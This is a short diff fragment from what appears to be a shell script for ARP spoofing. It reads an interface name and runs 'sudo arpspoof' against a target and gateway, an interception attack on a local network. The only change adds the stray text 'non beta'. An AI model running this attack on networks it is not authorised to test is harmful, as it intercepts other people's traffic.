@@ -17,7 +17,7 @@ done
 #ARPSPOOF COMMANDS
 read -p "enter the interface name [#ex:wlan0,eth0]: "  iface
 sudo arpspoof -i $iface -t $ip -r $gateway
-
+non beta
 
 
 
